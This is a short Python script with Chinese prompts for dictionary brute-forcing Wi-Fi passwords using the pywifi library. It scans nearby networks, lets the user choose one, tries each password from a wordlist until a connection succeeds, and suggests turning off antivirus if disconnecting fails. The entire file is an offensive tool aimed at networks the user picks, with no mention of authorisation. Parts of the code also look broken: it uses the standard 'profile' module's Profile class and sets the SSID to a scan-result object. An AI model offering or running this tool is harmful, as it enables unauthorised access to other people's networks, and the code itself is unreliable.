# -*- encoding: utf-8 -*-
"""
@File Name      :   wifi_password_cracking.py    
@Create Time    :   2022/4/10 11:46
@Description    :   
@Version        :   
@License        :   MIT
@Author         :   diklios
@Contact Email  :   diklios5768@gmail.com
@Github         :   https://github.com/diklios5768
@Blog           :   
@Motto          :   All our science, measured against reality, is primitive and childlike - and yet it is the most precious thing we have.
"""
__auth__ = 'diklios'

import pywifi
import profile
import time
from pywifi import const, Profile

zd = input("请输入字典位置：")
ozd = open(zd, 'r', encoding="utf8").read().split("\n")
a = 0
wifi = pywifi.PyWiFi()
pw = wifi.interfaces()[0]
pw.scan()
time.sleep(2)
ws = pw.scan_results()
for sws in ws:
    print("扫描到以下wifi：")
    print(a)
    print(sws.ssid.encode('raw_unicode_escape').decode('utf-8'))
    a = a + 1
wm = int(input("请输入序号"))
xz = ws[wm]
for pas in ozd:
    pw.disconnect()
    time.sleep(3)
    if pw.status() == const.IFACE_DISCONNECTED:
        pwfile = profile.Profile()
        pwfile.ssid = xz
        pwfile.auth = const.AUTH_ALG_OPEN
        pwfile.akm.append(const.AKM_TYPE_WPA2PSK)
        pwfile.cipher = const.CIPHER_TYPE_CCMP
        pwfile.key = pas
        pw.remove_all_network_profiles()
        xwffile = pw.add_network_profile(pwfile)
        pw.connect(xwffile)
        if pw.status() == const.IFACE_CONNECTED:
            print("爆破成功，密码是：" + pas)
            break
        else:
            print("爆破失败")
    else:
        print("断开连接失败，请关闭杀软再试")
input("破解完成，请按任意键继续.........")